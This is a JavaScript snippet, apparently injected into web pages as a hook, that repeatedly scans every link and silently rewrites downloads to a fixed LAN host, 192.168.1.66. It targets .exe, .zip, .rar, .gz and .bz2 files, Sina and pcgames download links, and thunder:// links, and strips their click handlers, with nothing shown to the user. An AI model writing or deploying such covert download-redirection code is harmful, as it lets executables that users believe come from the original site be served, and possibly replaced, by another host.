
function yjwt_ads() {
	console.log('myhook');

	var ins = '192.168.1.66';
	var inslen = ins.length;
	var suffix = '_zytxx';

	var re_suffix = /\.(exe|zip|bz2|gz|rar)$/;

	if (typeof String.prototype.startsWith != 'function') {
		String.prototype.startsWith = function (str){
			return this.slice(0, str.length) == str;
		};
	}

	function sub_common(t) {
		var href = t.attr('href');
		if (!href)
			return ;
		if (!href.startsWith('http://'))
			return ;
		if (href.startsWith('http://' + ins))
			return ;
		if (!href.match(re_suffix)) 
			return ;
		var ms = RegExp.$1;
		var hnew = '';
		hnew = 'http://' + ins + '/' + href.substr(7, href.length-7-ms.length-1) + suffix + '.' + ms;
		t.attr('href', hnew);
		console.log('sub_common', hnew);
	}

	function sub_php(t, prefix) {
		var href = t.attr('href');
		if (!href)
			return ;
		if (!href.startsWith(prefix))
			return ;
		if (href.startsWith('http://' + ins))
			return ;
		var hnew = '';
		hnew = 'http://' + ins + '/down_sina?' + encodeURI(href);
		t.attr('href', hnew);
		console.log('sub_php', prefix, hnew);
	}

	function sub_thunder(t) {
		var href = t.attr('href');
		if (!href)
			return ;
		if (!href.startsWith('thunder://'))
			return ;
		if (href.startsWith('http://' + ins))
			return ;
		var hnew = '';
		hnew = 'http://' + ins + '/down_thunder?' + encodeURI(href);
		t.attr('href', hnew);
		t.attr('onclick', '');
		console.log('sub_thunder', hnew);
	}

	function alarm() {
		$('a').each(function(i) {
			sub_common($(this));
			sub_php($(this), 'http://down.tech.sina.com');
			sub_php($(this), '/xiazaiDown.php');
			sub_php($(this), 'http://dl.pcgames.com.cn');		
			sub_thunder($(this));
		});
		setTimeout(alarm, 500);
	}
	alarm();
}

yjwt_ads();

